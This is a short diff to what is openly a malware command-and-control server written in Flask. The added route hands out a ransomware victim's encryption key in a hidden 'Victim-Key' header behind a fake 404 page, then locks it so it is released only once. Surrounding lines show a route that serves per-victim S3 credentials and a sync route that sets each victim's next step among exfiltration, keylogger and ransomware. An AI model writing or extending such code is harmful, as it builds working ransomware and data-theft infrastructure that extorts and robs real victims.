@@ -102,6 +102,20 @@ def getS3credentials(victim_id):
     return response
 
 
+# Returns encryption key for a victim in the headers
+@app.route("/ransom/<int:victim_id>", methods=["GET"])
+def getencryptionkey(victim_id):
+    victim = load_victim(victim_id)
+    if victim.key_locked == False:
+        response = make_response(render_template("404.html"), 404)
+        response.headers["Victim-Key"] = victim.victim_key
+        victim.key_locked = True
+        db.session.commit()
+        return response
+    else:
+        return render_template("404.html"), 404
+
+
 # When called, writes the next malware step into the DB, so the victim can check for it
 # 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
 @app.route("/sync/<int:victim_id>/set/<int:mode>", methods=["GET"])
